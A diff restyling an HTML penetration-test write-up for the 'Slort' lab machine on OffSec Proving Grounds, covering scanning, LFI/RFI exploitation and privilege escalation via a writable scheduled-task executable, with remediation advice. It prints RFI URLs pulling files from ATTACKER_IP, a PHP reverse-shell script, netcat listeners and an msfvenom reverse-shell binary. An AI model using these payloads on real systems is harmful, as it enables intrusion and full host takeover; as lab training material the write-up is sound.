@@ -1,96 +1,314 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" class="scroll-smooth">
 <head>
-  <meta charset="utf-8" />
-  <title>OffSec Proving Grounds - Slort Machine Penetration Test Report</title>
-  <style>
-    body { font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; line-height: 1.5; margin: 2rem auto; max-width: 960px; padding: 0 1rem; background: #111827; color: #e5e7eb; }
-    h1, h2, h3, h4 { color: #f9fafb; }
-    h1 { border-bottom: 2px solid #4b5563; padding-bottom: .5rem; margin-bottom: 1.5rem; }
-    h2 { margin-top: 2rem; border-bottom: 1px solid #374151; padding-bottom: .25rem; }
-    h3 { margin-top: 1.25rem; }
-    a { color: #60a5fa; }
-    code { font-family: "Fira Code", Menlo, Consolas, monospace; background: #020617; padding: 0 .25rem; border-radius: 3px; }
-    pre { background: #020617; padding: .75rem 1rem; border-radius: .5rem; overflow-x: auto; border: 1px solid #1f2937; font-size: .9rem; }
-    pre code { padding: 0; background: transparent; }
-    .meta-table { border-collapse: collapse; width: 100%; margin-bottom: 1.5rem; }
-    .meta-table th, .meta-table td { border: 1px solid #374151; padding: .5rem .75rem; text-align: left; }
-    .severity-critical { color: #fecaca; font-weight: 600; }
-    .severity-high { color: #fed7aa; font-weight: 600; }
-    .badge { display: inline-block; padding: 0.15rem 0.5rem; border-radius: 999px; font-size: .8rem; background: #1f2937; border: 1px solid #4b5563; }
-    .finding { border: 1px solid #4b5563; border-radius: .75rem; padding: 1rem 1.25rem; margin-top: 1.5rem; background: #020617; }
-    ul { margin-left: 1.25rem; }
-    img.screenshot { max-width: 100%; border-radius: 0.75rem; border: 1px solid #374151; margin: 0.75rem 0; }
-    figure { margin: 1rem 0; }
-    figure figcaption { font-size: .85rem; color: #9ca3af; margin-top: .25rem; }
-  </style>
+    <meta charset="utf-8" />
+    <title>OffSec Proving Grounds - Slort Machine Penetration Test Report</title>
+    
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- FontAwesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;600&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'cyber-black': '#0b1020',
+                        'cyber-gray': '#0f1733',
+                        'cyber-green': '#5eead4',
+                        'cyber-green-dim': 'rgba(94, 234, 212, 0.1)',
+                        'cyber-purple': '#a78bfa',
+                        'cyber-red': '#ff003c',
+                    },
+                    fontFamily: {
+                        mono: ['"Fira Code"', 'monospace'],
+                        tech: ['"Share Tech Mono"', 'monospace'],
+                    },
+                    boxShadow: {
+                        'neon': '0 0 10px rgba(94, 234, 212, 0.5), 0 0 20px rgba(94, 234, 212, 0.3)',
+                    }
+                }
+            }
+        }
+    </script>
+
+    <style>
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: #0b1020; }
+        ::-webkit-scrollbar-thumb { background: #23305f; border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: #5eead4; }
+        
+        .bg-grid {
+            background-size: 40px 40px;
+            background-image: linear-gradient(to right, rgba(94, 234, 212, 0.05) 1px, transparent 1px),
+                              linear-gradient(to bottom, rgba(167, 139, 250, 0.05) 1px, transparent 1px);
+        }
+
+        /* Scoped Styles for Report Content to match the theme without changing HTML structure heavily */
+        .report-content { color: #d1d5db; }
+        
+        .report-content h1 { 
+            font-family: "Share Tech Mono", monospace;
+            font-size: 2.5rem; 
+            font-weight: 700; 
+            color: #5eead4; /* cyber-green */
+            margin-bottom: 2rem; 
+            padding-bottom: 1rem; 
+            border-bottom: 2px solid rgba(94, 234, 212, 0.3);
+            text-shadow: 0 0 5px rgba(94, 234, 212, 0.3);
+        }
+
+        .report-content h2 { 
+            font-size: 1.8rem; 
+            font-weight: 700; 
+            color: #fff; 
+            margin-top: 3rem; 
+            margin-bottom: 1.5rem; 
+            padding-bottom: 0.5rem; 
+            border-bottom: 1px solid #23305f;
+            display: inline-block;
+            width: 100%;
+        }
+
+        .report-content h3 { 
+            font-size: 1.4rem; 
+            font-weight: 600; 
+            color: #a78bfa; /* cyber-purple */
+            margin-top: 2rem; 
+            margin-bottom: 1rem; 
+        }
+
+        .report-content h4 { 
+            font-size: 1.1rem; 
+            font-weight: 600; 
+            color: #e5e7eb; 
+            margin-top: 1.5rem; 
+            margin-bottom: 0.75rem; 
+        }
+
+        .report-content p { 
+            margin-bottom: 1.25rem; 
+            line-height: 1.7; 
+        }
+
+        .report-content a { 
+            color: #5eead4; 
+            text-decoration: none; 
+            border-bottom: 1px dotted #5eead4;
+            transition: all 0.2s;
+        }
+        .report-content a:hover {
+            color: #fff;
+            border-bottom-style: solid;
+        }
+
+        .report-content ul { 
+            list-style-type: disc; 
+            margin-left: 1.5rem; 
+            margin-bottom: 1.5rem; 
+            color: #9ca3af;
+        }
+        .report-content ul li {
+            margin-bottom: 0.5rem;
+        }
+
+        /* Code Blocks */
+        .report-content pre { 
+            background: #0f1733; /* cyber-gray */
+            border: 1px solid #23305f;
+            border-radius: 0.5rem; 
+            padding: 1rem; 
+            overflow-x: auto; 
+            margin-bottom: 1.5rem; 
+            font-family: "Fira Code", monospace;
+            font-size: 0.9rem;
+            color: #a78bfa;
+            box-shadow: inset 0 0 10px rgba(0,0,0,0.3);
+        }
+        .report-content code { 
+            font-family: "Fira Code", monospace; 
+            background: rgba(94, 234, 212, 0.1); 
+            color: #5eead4; 
+            padding: 0.1rem 0.3rem; 
+            border-radius: 0.25rem; 
+            font-size: 0.9em;
+        }
+        .report-content pre code {
+            background: transparent;
+            color: inherit;
+            padding: 0;
+            font-size: inherit;
+        }
+
+        /* Tables */
+        .meta-table { 
+            width: 100%; 
+            border-collapse: separate; 
+            border-spacing: 0; 
+            margin-bottom: 2rem; 
+            background: #0f1733;
+            border: 1px solid #23305f;
+            border-radius: 0.5rem;
+            overflow: hidden;
+        }
+        .meta-table th { 
+            background: #1a2342; 
+            color: #5eead4; 
+            text-align: left; 
+            padding: 1rem; 
+            border-bottom: 1px solid #23305f;
+            width: 20%;
+            font-weight: 600;
+        }
+        .meta-table td { 
+            padding: 1rem; 
+            border-bottom: 1px solid #23305f;
+            color: #e5e7eb;
+        }
+        .meta-table tr:last-child th, 
+        .meta-table tr:last-child td {
+            border-bottom: none;
+        }
+
+        /* Findings Box */
+        .finding { 
+            background: rgba(15, 23, 51, 0.6); 
+            border: 1px solid #23305f; 
+            border-radius: 0.75rem; 
+            padding: 2rem; 
+            margin-top: 2rem; 
+            margin-bottom: 2rem;
+            transition: border-color 0.3s;
+        }
+        .finding:hover {
+            border-color: #5eead4;
+        }
+
+        /* Severity Colors */
+        .severity-critical { color: #ff003c; font-weight: bold; text-shadow: 0 0 5px rgba(255, 0, 60, 0.4); }
+        .severity-high { color: #fbbf24; font-weight: bold; }
+        
+        /* Badges */
+        .badge { 
+            display: inline-block; 
+            padding: 0.25rem 0.75rem; 
+            border-radius: 999px; 
+            font-size: 0.75rem; 
+            background: #0b1020; 
+            border: 1px solid #374151; 
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        /* Images */
+        img.screenshot { 
+            max-width: 100%; 
+            border-radius: 0.5rem; 
+            border: 1px solid #23305f; 
+            margin: 1rem 0; 
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.5);
+        }
+        figure { margin: 2rem 0; }
+        figure figcaption { 
+            font-size: 0.85rem; 
+            color: #6b7280; 
+            margin-top: 0.5rem; 
+            font-family: "Fira Code", monospace;
+            text-align: center;
+        }
+    </style>
 </head>
-<body>
+<body class="bg-cyber-black text-gray-300 font-mono relative overflow-x-hidden min-h-screen flex flex-col">
 
-<h1>OffSec Proving Grounds &mdash; Slort<br />Penetration Test Report</h1>
+    <!-- Background Overlay -->
+    <div class="fixed inset-0 bg-grid pointer-events-none z-0"></div>
 
-<table class="meta-table">
-  <tr><th>Target</th><td>Slort (192.168.222.53)</td></tr>
-  <tr><th>Tester</th><td>Josh</td></tr>
-  <tr><th>Date</th><td>11 Dec 2025</td></tr>
-  <tr><th>Scope</th><td>Single Windows host, full TCP port scan and application exploitation.</td></tr>
-</table>
+    <!-- Navbar -->
+    <nav class="fixed w-full z-50 bg-cyber-black/90 backdrop-blur-md border-b border-[#23305f]">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex items-center justify-between h-16">
+                <div class="flex-shrink-0">
+                    <a href="reports.html" class="text-2xl font-bold text-cyber-green font-tech tracking-wider">&lt;josh/&gt;</a>
+                </div>
+                <div>
+                    <a href="reports.html" class="flex items-center text-gray-300 hover:text-white transition-colors">
+                        <i class="fas fa-arrow-left mr-2"></i> Back to Reports
+                    </a>
+                </div>
+            </div>
+        </div>
+    </nav>
 
-<h2>1. Executive Summary</h2>
-<p>
-During the assessment of the <strong>Slort</strong> machine, multiple high-impact issues were identified that allow an unauthenticated attacker to obtain a remote shell as the low-privileged user <code>slort\rupert</code> via a vulnerable PHP application, and then escalate privileges to <strong>LOCAL ADMINISTRATOR</strong> by abusing a misconfigured scheduled task that executes a writable backup executable.
-</p>
-<p>
-The compromise path is:
-</p>
-<ul>
-  <li>Enumerate open services (FTP, SMB, MySQL, Apache over 4443/8080).</li>
-  <li>Discover XAMPP web interface and the <code>/site/</code> virtual host.</li>
-  <li>Identify a <strong>Local File Inclusion</strong> (LFI) vulnerability in <code>index.php?page=</code>.</li>
-  <li>Confirm <strong>Remote File Inclusion</strong> (RFI) and achieve RCE via PHP include, obtaining a shell as <code>slort\rupert</code>.</li>
-  <li>Enumerate Windows scheduled tasks and backup scripts.</li>
-  <li>Abuse a SYSTEM-level scheduled task that executes <code>C:\Backup\TFTP.EXE</code> every 5 minutes.</li>
-  <li>Replace <code>TFTP.EXE</code> with a malicious reverse shell payload and gain an <strong>administrator shell</strong> (<code>slort\administrator</code>).</li>
-</ul>
+    <!-- Main Content -->
+    <main class="relative z-10 pt-32 pb-20 max-w-5xl mx-auto px-4 sm:px-6 lg:px-8 flex-grow report-content">
+        
+        <h1>OffSec Proving Grounds &mdash; Slort<br />Penetration Test Report</h1>
 
-<p>
-Overall risk for the host is assessed as <span class="severity-critical">Critical</span>: unauthenticated remote attackers can ultimately fully compromise the system.
-</p>
+        <table class="meta-table">
+          <tr><th>Target</th><td>Slort (192.168.222.53)</td></tr>
+          <tr><th>Tester</th><td>Josh</td></tr>
+          <tr><th>Date</th><td>11 Dec 2025</td></tr>
+          <tr><th>Scope</th><td>Single Windows host, full TCP port scan and application exploitation.</td></tr>
+        </table>
 
-<h2>2. Methodology Overview</h2>
+        <h2>1. Executive Summary</h2>
+        <p>
+        During the assessment of the <strong>Slort</strong> machine, multiple high-impact issues were identified that allow an unauthenticated attacker to obtain a remote shell as the low-privileged user <code>slort\rupert</code> via a vulnerable PHP application, and then escalate privileges to <strong>LOCAL ADMINISTRATOR</strong> by abusing a misconfigured scheduled task that executes a writable backup executable.
+        </p>
+        <p>
+        The compromise path is:
+        </p>
+        <ul>
+          <li>Enumerate open services (FTP, SMB, MySQL, Apache over 4443/8080).</li>
+          <li>Discover XAMPP web interface and the <code>/site/</code> virtual host.</li>
+          <li>Identify a <strong>Local File Inclusion</strong> (LFI) vulnerability in <code>index.php?page=</code>.</li>
+          <li>Confirm <strong>Remote File Inclusion</strong> (RFI) and achieve RCE via PHP include, obtaining a shell as <code>slort\rupert</code>.</li>
+          <li>Enumerate Windows scheduled tasks and backup scripts.</li>
+          <li>Abuse a SYSTEM-level scheduled task that executes <code>C:\Backup\TFTP.EXE</code> every 5 minutes.</li>
+          <li>Replace <code>TFTP.EXE</code> with a malicious reverse shell payload and gain an <strong>administrator shell</strong> (<code>slort\administrator</code>).</li>
+        </ul>
 
-<h3>2.1 Network Discovery</h3>
-<p>
-A full TCP port scan was performed against the target using <code>nmap</code> with all ports, followed by a targeted service and version scan on interesting ports.
-</p>
-<pre><code># Full port scan
+        <p>
+        Overall risk for the host is assessed as <span class="severity-critical">Critical</span>: unauthenticated remote attackers can ultimately fully compromise the system.
+        </p>
+
+        <h2>2. Methodology Overview</h2>
+
+        <h3>2.1 Network Discovery</h3>
+        <p>
+        A full TCP port scan was performed against the target using <code>nmap</code> with all ports, followed by a targeted service and version scan on interesting ports.
+        </p>
+        <pre><code># Full port scan
 nmap -p- -Pn -n -sS -oN all_port.md 192.168.222.53
 
 # Service / version detection
 nmap -sCVT -p 21,135,139,445,3306,4443,5040,8080 -oN service_ports.md 192.168.222.53
 </code></pre>
 
-<figure>
-  <img class="screenshot" src="images/service_ports.png" alt="Nmap service scan results" />
-  <figcaption>Figure 1 &mdash; Nmap service and version scan on Slort.</figcaption>
-</figure>
+        <figure>
+          <img class="screenshot" src="images/service_ports.png" alt="Nmap service scan results" />
+          <figcaption>Figure 1 &mdash; Nmap service and version scan on Slort.</figcaption>
+        </figure>
 
-<p>
-Key exposed services:
-</p>
-<ul>
-  <li><strong>21/tcp</strong> &mdash; FileZilla FTP 0.9.41 (UNIX emulated)</li>
-  <li><strong>445/tcp</strong> &mdash; SMB (Windows)</li>
-  <li><strong>3306/tcp</strong> &mdash; MariaDB</li>
-  <li><strong>4443/tcp</strong> &mdash; Apache httpd 2.4.43 (XAMPP dashboard)</li>
-  <li><strong>8080/tcp</strong> &mdash; Apache httpd 2.4.43 serving the vulnerable <code>/site/</code> application</li>
-</ul>
+        <p>
+        Key exposed services:
+        </p>
+        <ul>
+          <li><strong>21/tcp</strong> &mdash; FileZilla FTP 0.9.41 (UNIX emulated)</li>
+          <li><strong>445/tcp</strong> &mdash; SMB (Windows)</li>
+          <li><strong>3306/tcp</strong> &mdash; MariaDB</li>
+          <li><strong>4443/tcp</strong> &mdash; Apache httpd 2.4.43 (XAMPP dashboard)</li>
+          <li><strong>8080/tcp</strong> &mdash; Apache httpd 2.4.43 serving the vulnerable <code>/site/</code> application</li>
+        </ul>
 
-<h3>2.2 Web Enumeration</h3>
-<p>
-The virtual host on port 8080 exposes a XAMPP dashboard and an additional <code>/site/</code> directory. Directory enumeration was performed using a wordlist-based fuzzer against <code>http://192.168.222.53:8080/site/</code>.
-</p>
-<pre><code># Example directory fuzzing command (simplified)
+        <h3>2.2 Web Enumeration</h3>
+        <p>
+        The virtual host on port 8080 exposes a XAMPP dashboard and an additional <code>/site/</code> directory. Directory enumeration was performed using a wordlist-based fuzzer against <code>http://192.168.222.53:8080/site/</code>.
+        </p>
+        <pre><code># Example directory fuzzing command (simplified)
 gobuster dir \
   -u http://192.168.222.53:8080/ \
   -w &lt;wordlist&gt; \
@@ -98,44 +316,44 @@ gobuster dir \
 </code></pre>
 
 
-<figure>
-  <img class="screenshot" src="images/fuzz_base.png" alt="Directory fuzzing results" />
-  <figcaption>Figure 2 &mdash; Directory fuzzing showing discovery of <code>/dashboard/</code> and <code>/site/</code>.</figcaption>
-</figure>
+        <figure>
+          <img class="screenshot" src="images/fuzz_base.png" alt="Directory fuzzing results" />
+          <figcaption>Figure 2 &mdash; Directory fuzzing showing discovery of <code>/dashboard/</code> and <code>/site/</code>.</figcaption>
+        </figure>
 
-<p>
-Relevant discovered paths under the main vhost included:
-</p>
-<ul>
-  <li><code>/dashboard/</code> &mdash; XAMPP dashboard</li>
-  <li><code>/site/</code> &mdash; custom PHP application</li>
-</ul>
+        <p>
+        Relevant discovered paths under the main vhost included:
+        </p>
+        <ul>
+          <li><code>/dashboard/</code> &mdash; XAMPP dashboard</li>
+          <li><code>/site/</code> &mdash; custom PHP application</li>
+        </ul>
 
-<h2>3. Findings</h2>
+        <h2>3. Findings</h2>
 
-<div class="finding">
-  <h3>Finding 1 &mdash; Remote File Inclusion in <code>/site/index.php?page=</code></h3>
-  <p><span class="badge severity-critical">Severity: Critical</span></p>
+        <div class="finding">
+          <h3>Finding 1 &mdash; Remote File Inclusion in <code>/site/index.php?page=</code></h3>
+          <p><span class="badge severity-critical">Severity: Critical</span></p>
 
-  <h4>3.1.1 Description</h4>
-  <p>
-The main entry point of the web application, <code>/site/index.php</code>, uses a <code>page</code> query parameter to include PHP files without proper validation. The application constructs an include path directly from user input and passes it to <code>include()</code>, which leads to both <strong>Local File Inclusion (LFI)</strong> and <strong>Remote File Inclusion (RFI)</strong> when combined with PHP configuration that allows remote URLs.
-  </p>
+          <h4>3.1.1 Description</h4>
+          <p>
+        The main entry point of the web application, <code>/site/index.php</code>, uses a <code>page</code> query parameter to include PHP files without proper validation. The application constructs an include path directly from user input and passes it to <code>include()</code>, which leads to both <strong>Local File Inclusion (LFI)</strong> and <strong>Remote File Inclusion (RFI)</strong> when combined with PHP configuration that allows remote URLs.
+          </p>
 
-  <h4>3.1.2 Evidence &ndash; LFI proof</h4>
-  <p>
-  Requesting <code>win.ini</code> from the Windows directory confirms LFI:
-  </p>
-  <pre><code>GET /site/index.php?page=..\..\..\Windows\win.ini HTTP/1.1
+          <h4>3.1.2 Evidence &ndash; LFI proof</h4>
+          <p>
+          Requesting <code>win.ini</code> from the Windows directory confirms LFI:
+          </p>
+          <pre><code>GET /site/index.php?page=..\..\..\Windows\win.ini HTTP/1.1
 Host: 192.168.222.53:8080
 
 # Browser PoC URL
 http://192.168.222.53:8080/site/index.php?page=..\..\..\Windows\win.ini
 </code></pre>
-  <p>
-  The response contained typical contents of <code>win.ini</code> such as:
-  </p>
-  <pre><code>; for 16-bit app support
+          <p>
+          The response contained typical contents of <code>win.ini</code> such as:
+          </p>
+          <pre><code>; for 16-bit app support
 [fonts]
 [extensions]
 [mci extensions]
@@ -145,17 +363,17 @@ MAPI=1
 </code></pre>
 
 
-<figure>
-  <img class="screenshot" src="images/LFI_Proof.png" alt="LFI proof loading win.ini" />
-  <figcaption>Figure 4 &mdash; LFI proof by including <code>Windows\win.ini</code>.</figcaption>
-</figure>
+        <figure>
+          <img class="screenshot" src="images/LFI_Proof.png" alt="LFI proof loading win.ini" />
+          <figcaption>Figure 4 &mdash; LFI proof by including <code>Windows\win.ini</code>.</figcaption>
+        </figure>
 
 
-  <h4>3.1.3 Evidence &ndash; RFI proof and initial code execution</h4>
-  <p>
-  A minimal PHP payload was hosted on the attacker machine:
-  </p>
-  <pre><code># On attacker host
+          <h4>3.1.3 Evidence &ndash; RFI proof and initial code execution</h4>
+          <p>
+          A minimal PHP payload was hosted on the attacker machine:
+          </p>
+          <pre><code># On attacker host
 mkdir -p /tmp/slort &amp;&amp; cd /tmp/slort
 printf '&lt;?php echo "RFI-TEST-OK"; ?&gt;' &gt; shell.txt
 python3 -m http.server 80
@@ -163,20 +381,20 @@ python3 -m http.server 80
 # Trigger from browser or curl
 http://192.168.222.53:8080/site/index.php?page=http://ATTACKER_IP/shell.txt
 </code></pre>
-  <p>
-  The string <code>RFI-TEST-OK</code> appeared in the HTTP response, confirming that the application remotely included and executed the external PHP file.
-  </p>
+          <p>
+          The string <code>RFI-TEST-OK</code> appeared in the HTTP response, confirming that the application remotely included and executed the external PHP file.
+          </p>
 
-  <figure>
-  <img class="screenshot" src="images/RFI_Proof.png" alt="RFI PoC" />
-  <figcaption>Figure 5 &mdash; RFI PoC including remote payload from attacker HTTP server.</figcaption>
-</figure>
+          <figure>
+          <img class="screenshot" src="images/RFI_Proof.png" alt="RFI PoC" />
+          <figcaption>Figure 5 &mdash; RFI PoC including remote payload from attacker HTTP server.</figcaption>
+        </figure>
 
-  <h4>3.1.4 Exploitation &ndash; Reverse shell as <code>slort\rupert</code></h4>
-  <p>
-  To gain a foothold on the host, the RFI was used to include a PHP script that opened a reverse shell back to the attacker.
-  </p>
-  <pre><code># /tmp/slort/shell.php on attacker host
+          <h4>3.1.4 Exploitation &ndash; Reverse shell as <code>slort\rupert</code></h4>
+          <p>
+          To gain a foothold on the host, the RFI was used to include a PHP script that opened a reverse shell back to the attacker.
+          </p>
+          <pre><code># /tmp/slort/shell.php on attacker host
 &lt;?php
 $ip   = 'ATTACKER_IP';
 $port = 88;
@@ -194,46 +412,46 @@ nc -nvlp 88
 http://192.168.222.53:8080/site/index.php?page=http://ATTACKER_IP/shell.php
 </code></pre>
 
-  <p>
-  Once triggered, a Windows command shell connected back to the listener. Running <code>whoami</code> in that shell revealed a low-privileged user context:
-  </p>
-  <pre><code>C:\WINDOWS\system32&gt; whoami
+          <p>
+          Once triggered, a Windows command shell connected back to the listener. Running <code>whoami</code> in that shell revealed a low-privileged user context:
+          </p>
+          <pre><code>C:\WINDOWS\system32&gt; whoami
 slort\rupert
 </code></pre>
-  <p>
-  This confirms that exploitation of the RFI yields code execution as <code>slort\rupert</code>, which was then used as a starting point for local privilege escalation.
-  </p>
+          <p>
+          This confirms that exploitation of the RFI yields code execution as <code>slort\rupert</code>, which was then used as a starting point for local privilege escalation.
+          </p>
 
-  <h4>3.1.5 Impact</h4>
-  <ul>
-    <li>Unauthenticated remote attackers can execute arbitrary PHP code on the server.</li>
-    <li>This results in a direct remote shell as <code>slort\rupert</code>, enabling further local attacks.</li>
-    <li>Attackers can deploy backdoors, enumerate local secrets, and pivot towards privilege escalation vectors.</li>
-  </ul>
+          <h4>3.1.5 Impact</h4>
+          <ul>
+            <li>Unauthenticated remote attackers can execute arbitrary PHP code on the server.</li>
+            <li>This results in a direct remote shell as <code>slort\rupert</code>, enabling further local attacks.</li>
+            <li>Attackers can deploy backdoors, enumerate local secrets, and pivot towards privilege escalation vectors.</li>
+          </ul>
 
-  <h4>3.1.6 Recommendations</h4>
-  <ul>
-    <li>Remove dynamic file inclusion based on unsanitized user input. Replace with a strict server-side router or a whitelist of allowed views.</li>
-    <li>Disable <code>allow_url_include</code> and <code>allow_url_fopen</code> in <code>php.ini</code> where not strictly required.</li>
-    <li>Run the web server under a dedicated, low-privileged service account with minimal local rights.</li>
-    <li>Implement input validation and canonicalization for all query parameters.</li>
-  </ul>
-</div>
+          <h4>3.1.6 Recommendations</h4>
+          <ul>
+            <li>Remove dynamic file inclusion based on unsanitized user input. Replace with a strict server-side router or a whitelist of allowed views.</li>
+            <li>Disable <code>allow_url_include</code> and <code>allow_url_fopen</code> in <code>php.ini</code> where not strictly required.</li>
+            <li>Run the web server under a dedicated, low-privileged service account with minimal local rights.</li>
+            <li>Implement input validation and canonicalization for all query parameters.</li>
+          </ul>
+        </div>
 
-<div class="finding">
-  <h3>Finding 2 &mdash; Privilege Escalation via Writable Backup Executable Used by Scheduled Task</h3>
-  <p><span class="badge severity-high">Severity: High</span></p>
+        <div class="finding">
+          <h3>Finding 2 &mdash; Privilege Escalation via Writable Backup Executable Used by Scheduled Task</h3>
+          <p><span class="badge severity-high">Severity: High</span></p>
 
-  <h4>3.2.1 Description</h4>
-  <p>
-  A scheduled backup job on the host executes an executable located in <code>C:\Backup\</code> every five minutes. The executable and its containing directory are writable by the compromised user, allowing an attacker with a shell as <code>slort\rupert</code> to replace the executable with a malicious payload. Because the task runs with elevated privileges (administrator/SYSTEM), the payload is executed with full control of the system.
-  </p>
+          <h4>3.2.1 Description</h4>
+          <p>
+          A scheduled backup job on the host executes an executable located in <code>C:\Backup\</code> every five minutes. The executable and its containing directory are writable by the compromised user, allowing an attacker with a shell as <code>slort\rupert</code> to replace the executable with a malicious payload. Because the task runs with elevated privileges (administrator/SYSTEM), the payload is executed with full control of the system.
+          </p>
 
-  <h4>3.2.2 Evidence</h4>
-  <p>
-  While enumerating the file system from the obtained shell, the following directory was discovered:
-  </p>
-  <pre><code>PS C:\&gt; cd C:\Backup
+          <h4>3.2.2 Evidence</h4>
+          <p>
+          While enumerating the file system from the obtained shell, the following directory was discovered:
+          </p>
+          <pre><code>PS C:\&gt; cd C:\Backup
 PS C:\Backup&gt; ls
 
     Directory: C:\Backup
@@ -249,14 +467,14 @@ Run every 5 minutes:
 C:\Backup\TFTP.EXE -i 192.168.234.57 get backup.txt
 </code></pre>
 
-  <p>
-  The <code>info.txt</code> file documents that a scheduled task is configured to invoke <code>C:\Backup\TFTP.EXE</code> every five minutes. The presence of this custom backup folder and executable in the root of C: is a strong indicator of a misconfigured operational script.
-  </p>
+          <p>
+          The <code>info.txt</code> file documents that a scheduled task is configured to invoke <code>C:\Backup\TFTP.EXE</code> every five minutes. The presence of this custom backup folder and executable in the root of C: is a strong indicator of a misconfigured operational script.
+          </p>
 
-  <p>
-  The executable was replaced with a malicious payload. A reverse shell binary was prepared on the attacker machine and transferred to the host, overwriting the original <code>TFTP.EXE</code>:
-  </p>
-  <pre><code># On attacker host: create a Windows reverse shell executable (example)
+          <p>
+          The executable was replaced with a malicious payload. A reverse shell binary was prepared on the attacker machine and transferred to the host, overwriting the original <code>TFTP.EXE</code>:
+          </p>
+          <pre><code># On attacker host: create a Windows reverse shell executable (example)
 msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=88 -f exe -o TFTP.exe
 python3 -m http.server 8888
 
@@ -273,58 +491,69 @@ Mode   LastWriteTime      Length Name
 -a---- 12/11/2025  4:13 AM  7680 TFTP.EXE   &lt;-- replaced
 </code></pre>
 
-  <h4>3.2.3 Exploitation &ndash; Automatic privilege escalation to <code>slort\administrator</code></h4>
-  <p>
-  A netcat listener was started on the attacker host:
-  </p>
-  <pre><code>nc -nvlp 88
+          <h4>3.2.3 Exploitation &ndash; Automatic privilege escalation to <code>slort\administrator</code></h4>
+          <p>
+          A netcat listener was started on the attacker host:
+          </p>
+          <pre><code>nc -nvlp 88
 </code></pre>
-  <p>
-  After waiting for the next 5-minute execution interval, a new reverse shell connected back. Running <code>whoami</code> confirmed elevated privileges:
-  </p>
-  <pre><code>C:\WINDOWS\system32&gt; whoami
+          <p>
+          After waiting for the next 5-minute execution interval, a new reverse shell connected back. Running <code>whoami</code> confirmed elevated privileges:
+          </p>
+          <pre><code>C:\WINDOWS\system32&gt; whoami
 slort\administrator
 </code></pre>
 
-  <h4>3.2.4 Impact</h4>
-  <ul>
-    <li>Any user who can write to <code>C:\Backup\</code> can execute arbitrary code with the privileges of the scheduled task (administrator/SYSTEM).</li>
-    <li>This converts the initial low-privileged web shell into full control over the host.</li>
-    <li>Attackers can maintain persistence by keeping a modified backup executable in place.</li>
-  </ul>
+          <h4>3.2.4 Impact</h4>
+          <ul>
+            <li>Any user who can write to <code>C:\Backup\</code> can execute arbitrary code with the privileges of the scheduled task (administrator/SYSTEM).</li>
+            <li>This converts the initial low-privileged web shell into full control over the host.</li>
+            <li>Attackers can maintain persistence by keeping a modified backup executable in place.</li>
+          </ul>
 
-  <h4>3.2.5 Recommendations</h4>
-  <ul>
-    <li>Relocate operational scripts and executables to directories where only administrators have write access.</li>
-    <li>Harden NTFS permissions on <code>C:\Backup\</code> so that unprivileged users cannot modify contents.</li>
-    <li>Replace ad-hoc backup tasks with centrally managed and audited backup solutions.</li>
-    <li>Regularly review all scheduled tasks to ensure that no high-privilege task executes binaries from writable locations.</li>
-  </ul>
-</div>
+          <h4>3.2.5 Recommendations</h4>
+          <ul>
+            <li>Relocate operational scripts and executables to directories where only administrators have write access.</li>
+            <li>Harden NTFS permissions on <code>C:\Backup\</code> so that unprivileged users cannot modify contents.</li>
+            <li>Replace ad-hoc backup tasks with centrally managed and audited backup solutions.</li>
+            <li>Regularly review all scheduled tasks to ensure that no high-privilege task executes binaries from writable locations.</li>
+          </ul>
+        </div>
 
-<h2>4. Additional Notes</h2>
-<ul>
-  <li>Other exposed services (FTP, SMB, MySQL) were identified during enumeration but were not required for successful exploitation due to the critical RFI and scheduled task misconfiguration in the web stack.</li>
-  <li>The risk posed by these applications remains and should be reviewed in a broader infrastructure assessment.</li>
-</ul>
+        <h2>4. Additional Notes</h2>
+        <ul>
+          <li>Other exposed services (FTP, SMB, MySQL) were identified during enumeration but were not required for successful exploitation due to the critical RFI and scheduled task misconfiguration in the web stack.</li>
+          <li>The risk posed by these applications remains and should be reviewed in a broader infrastructure assessment.</li>
+        </ul>
 
-<h2>5. Evidence Screenshots</h2>
-<p>
-The following images should be placed in an <code>images/</code> folder next to this HTML file. Update filenames as needed to match your captures.
-</p>
+        <h2>5. Evidence Screenshots</h2>
+        <p>
+        The following images should be placed in an <code>images/</code> folder next to this HTML file. Update filenames as needed to match your captures.
+        </p>
 
-<h2>6. Conclusion</h2>
-<p>
-The Slort machine is critically vulnerable due to a chain of misconfigurations:
-</p>
-<ul>
-  <li>A PHP application that trusts unvalidated user input in an <code>include()</code> call, enabling RFI and RCE.</li>
-  <li>The web application running under a user context that is able to write to sensitive backup folders.</li>
-  <li>A scheduled backup task that executes a writable executable from <code>C:\Backup\</code> at regular intervals with elevated privileges.</li>
-</ul>
-<p>
-By exploiting these issues, a remote unauthenticated attacker can obtain an initial shell as <code>slort\rupert</code> and then escalate to full administrative control over the host. The remediation steps listed above should be prioritized and implemented before deploying similar stacks in production.
-</p>
+        <h2>6. Conclusion</h2>
+        <p>
+        The Slort machine is critically vulnerable due to a chain of misconfigurations:
+        </p>
+        <ul>
+          <li>A PHP application that trusts unvalidated user input in an <code>include()</code> call, enabling RFI and RCE.</li>
+          <li>The web application running under a user context that is able to write to sensitive backup folders.</li>
+          <li>A scheduled backup task that executes a writable executable from <code>C:\Backup\</code> at regular intervals with elevated privileges.</li>
+        </ul>
+        <p>
+        By exploiting these issues, a remote unauthenticated attacker can obtain an initial shell as <code>slort\rupert</code> and then escalate to full administrative control over the host. The remediation steps listed above should be prioritized and implemented before deploying similar stacks in production.
+        </p>
+
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-black border-t border-[#23305f] py-8 mt-auto relative">
+        <div class="max-w-7xl mx-auto px-4 text-center">
+            <p class="text-gray-600 text-sm font-mono">
